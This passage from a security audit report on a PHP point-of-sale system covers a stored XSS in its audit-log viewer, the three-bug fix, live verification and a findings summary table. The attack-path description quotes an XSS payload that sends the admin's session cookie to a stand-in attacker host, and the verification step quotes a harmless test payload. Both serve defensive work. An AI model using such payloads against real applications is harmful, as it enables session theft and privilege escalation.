intentionally or by mis-click, with no authorization control and no distinguishing audit signal.

**Proposed fix:** decide whether wholesale pricing should require a permission (e.g., a new
`apply_wholesale_price`) similar to `apply_discount`, and enforce it server-side alongside the F-12 fix.
Flagging as an open business question — some shops intentionally let any cashier serve known wholesale
customers without gatekeeping.

---

### F-15 — Critical — Stored XSS in the Audit Log viewer, with a plausible cashier→admin privilege-escalation path — ✅ FIXED (turned out to be three bugs, not one)

> **Fix applied (bug 1, the originally-identified one):** `formatValue()` in `audit/index.php` now
> HTML-escapes every key and value (via a small `escapeHtml()` helper using `textContent`/`innerHTML`
> round-tripping) before building the HTML string that gets assigned to `.innerHTML`. Also wrapped the
> server-rendered `$desc` summary column in `e()` as defense-in-depth (it wasn't actually reachable
> with attacker data today, since none of its current branches interpolate free-text fields, but the
> pattern was fragile — a future branch handling `process_return`'s `reason` field would have silently
> reopened this exact hole).
>
> **Bug 2, found while testing the fix for bug 1:** the "عرض التفاصيل" button embedded the log data as
> `onclick='showAuditModal(<?= json_encode($log, JSON_UNESCAPED_UNICODE) ?>)'` — a single-quote-
> delimited attribute containing raw, unescaped JSON. Any value in that JSON containing a literal
> single quote (an apostrophe in a customer name, a return reason, anything) would terminate the
> `onclick` attribute early and inject arbitrary markup into the row — a second, independent HTML-
> injection vector, unrelated to the `innerHTML` one. Fixed by switching to
> `data-log='<?= e(json_encode($log, JSON_UNESCAPED_UNICODE)) ?>'` (properly HTML-entity-escaped via
> the app's existing `e()` helper, which uses `ENT_QUOTES` and so is safe regardless of which quote
> character delimits the attribute) plus a `.js-audit-details` click-listener that reads
> `JSON.parse(this.dataset.log)` instead of relying on inline-JS argument passing.
>
> **Bug 3, found while testing the fix for bug 2 — pre-existing, unrelated to anything I changed:**
> `formatValue()`'s HTML-building code used **single-quoted JS string literals containing a literal,
> raw newline character** (`let html = '<div>...\n...</table>';`), which is a hard JavaScript syntax
> error — single/double-quoted strings cannot span lines; only backtick template literals can. This
> broke the entire `<script>` block on every page load, meaning the "عرض التفاصيل" (View Details)
> button has **never actually worked**, on any log entry, since this file was written — clicking it
> silently did nothing. This predates today's audit entirely; I only found it because my fix for bug 2
> made the button attempt to run real code (via `addEventListener`) for the first time in this testing
> session, which is when the console started showing `SyntaxError: Invalid or unexpected token`. Fixed
> by converting both multi-line string literals to backtick template literals.
>
> All three fixed together in `audit/index.php`, ported to `store2/audit/index.php` as-is (brand-
> agnostic file).
>
> **Verified live, end-to-end, with a real stored-XSS payload:** inserted an audit-log row with
> `reason` containing `<img src=x onerror="window.__xss_fired=true; document.title='XSS-FIRED';">`
> (deliberately including a literal single quote, to exercise bug 2 as well as bug 1), logged in as a
> real admin session, and clicked "عرض التفاصيل" on that exact row:
> - No JS error on click.
> - `window.__xss_fired` stayed `false`, `document.title` never changed — the script did not execute.
> - The modal opened correctly (bug 3's fix confirmed — this literally could not have happened before
>   today) and displayed the payload as visible, inert text:
>   `&lt;img src=x onerror="...&gt;` — safely escaped, not rendered as a tag.

**Original finding (for reference):**

**Invariant:** security checklist item (XSS), explicitly requested in the audit scope.
**Files:** `audit/index.php:134-158` (`formatValue()`), combined with any endpoint that writes free-text into `logAudit()`'s old/new-value payloads without sanitizing it — e.g. `sales/return.php:52` (`reason` is `trim()`-only, no escaping), `sales/cancel.php`, `sales/sync_offline_actions.php` (same `reason` field), `exhibitions/expense_action.php` (`notes`/`title`), `products/create.php`/`edit.php` (product names).

**Root cause:** `logAudit()` stores its `old`/`new` payloads via `json_encode()`, which escapes for JSON
syntax but does **not** HTML-escape the string values inside. `audit/index.php`'s client-side
`formatValue()` then parses that JSON and interpolates each value directly into an HTML template
string (`${displayV}`), which is assigned via `.innerHTML =`. No escaping happens at either end.

**Concrete attack path:** any authenticated cashier who can process a return (which is most cashiers,
by design) can enter a return reason of, for example,
`<img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)">`. This is accepted and
stored as-is. The next time an admin or accountant opens the Audit Log and views that entry's details
(a normal, expected part of their job), the injected script executes in their authenticated session —
capable of exfiltrating their session cookie, or performing any action the admin's session can perform,
directly in their browser. This is a real path from "cashier" to "acts as admin," which is more severe
than a typical XSS because of who is guaranteed to view the payload (an admin, specifically, reviewing
audit history) and how ordinary the trigger action (processing a return with a reason) is.

**Proposed fix:** HTML-escape every value in `formatValue()` before interpolating it (a small
`escapeHtml()` JS helper), as defense-in-depth against every other current and future field that ends
up inside an audit-log payload — do not rely on sanitizing each individual writer, since new ones will
be added over time and any one miss reopens the hole.

---

## Summary table

| ID | Severity | Invariant | Status |
|---|---|---|---|
| R-01 | Critical | 1, 7, 8 | ✅ Resolved (prior session) |
| R-02 | Critical | 6 | ✅ Resolved (prior session) |
| F-00 | Critical | 4 | ✅ Fixed — verified live |
| F-01 | Critical | 10 | ✅ Fixed — verified live |
| F-02 | Critical | 15 (new) | 🔴 Open — not in your approved fix list |
| F-04 | Critical | 11 | ✅ Fixed — verified live |
| F-12 | Critical | 12 / general | ✅ Fixed — verified live |
| F-15 | Critical | security (XSS) | ✅ Fixed — verified live |
| F-03 | High | 9 | ✅ Fixed — verified live |
| F-13 | High | 16 (new) | ✅ Fixed — verified live |
| F-05 | Medium | general | ✅ Fixed — verified live |
| F-06 | Medium | profit accuracy | ✅ Fixed — verified live |
| F-07 | Medium | 10-adjacent | ✅ Fixed — verified live |
| F-08 | Medium | 7 | ✅ Fixed — verified live |
| F-14 | Medium | general | ✅ Fixed — verified live |
| F-09 | Low | general | 🔴 Open |
| F-10 | Low/info | 5 | ℹ️ Not a violation — question for you |
| F-11 | Low | 12 | 🔴 Open |

**All Critical, High, and Medium findings are fixed and verified (except F-02, which was
deliberately excluded from your approved Critical fix list). Stopping here per your instruction —
waiting for your review before touching the Low findings (F-09, F-10, F-11).**
